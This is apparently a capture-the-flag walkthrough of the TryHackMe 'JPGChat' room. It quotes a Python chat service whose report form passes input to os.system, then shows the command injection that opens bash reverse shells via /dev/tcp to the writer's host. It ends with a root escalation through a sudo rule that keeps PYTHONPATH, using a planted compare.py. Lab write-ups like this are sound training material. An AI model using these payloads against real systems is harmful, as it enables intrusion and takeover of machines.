## JPGChat
*Exploiting poorly made custom chatting service written in a certain language...*

The picture attached with this new [room](https://tryhackme.com/room/jpgchat) is the Python symbol, so I think we can guess what the language might be.

## Ports
SSH and port 3000. What's that?

## 3000
Let's try telnet:

{% highlight shell %}
â””â”€# telnet 10.10.228.16 3000                                                                                                    
Trying 10.10.228.16...
Connected to 10.10.228.16.
Escape character is '^]'.
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[MESSAGE]
Connection closed by foreign host.
{% endhighlight %}

Oooooookkkkk.

Netcat:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/jpgchat]
â””â”€# nc 10.10.228.16 3000                                                                                                        
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[MESSAGE]
There are currently 0 other users logged in
[MESSAGE]: something
[MESSAGE]: somethingelse
{% endhighlight %}

Netcat it is then.

If we send [REPORT], we get this:

>this report will be read by Mozzie-jpg

Let's assume this is our admin, and we want to look at the source code on Github.

Google says:

>No results found for "Mozzie-jpg" site:github.com.

Let's go there directly: https://github.com/Mozzie-jpg/

Bingo. We want [this](https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py).

{% highlight python %}
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
{% endhighlight %}

We can see that the report is vulnerable to command injection. Like so:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/jpgchat]
â””â”€# nc 10.10.228.16 3000                                                                                                        
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
me && bash -i >& /dev/tcp/10.9.10.123/1234 0>&1
your report:
{% endhighlight %}

For some reason this doesn't want to give me a very nice shell, so I just use it to send myself a better one:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/jpgchat]
â””â”€# nc -nvlp 1234                                                                                                           1 â¨¯

bash -i >& /dev/tcp/10.9.10.123/1235 0>&1
{% endhighlight %}

## A better shell

{% highlight shell %}
wes@ubuntu-xenial:/$ id
id
uid=1001(wes) gid=1001(wes) groups=1001(wes)
wes@ubuntu-xenial:/$ which python
which python
/usr/bin/python
wes@ubuntu-xenial:/$ python -c 'import pty;pty.spawn("/bin/bash");'
python -c 'import pty;pty.spawn("/bin/bash");'
wes@ubuntu-xenial:/$ sudo -l
sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
{% endhighlight %}

We better have a look at that script then:

{% highlight python %}
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
{% endhighlight %}

Not much to it. Let's go!

{% highlight shell %}
wes@ubuntu-xenial:~$ printf 'import os\nos.system("/bin/bash")\n' >> compare.py
< 'import os\nos.system("/bin/bash")\n' >> compare.py                        
wes@ubuntu-xenial:~$ cat compare.py
cat compare.py
import os
os.system("/bin/bash")
wes@ubuntu-xenial:~$ chmod +x compare.py
wes@ubuntu-xenial:~$ sudo -u root PYTHONPATH=./:${PYTHONPATH} /usr/bin/python3 /opt/development/test_module.py
root@ubuntu-xenial:~# cd /root
cd /root
root@ubuntu-xenial:/root#
# etc, read flag blah blah
{% endhighlight %}
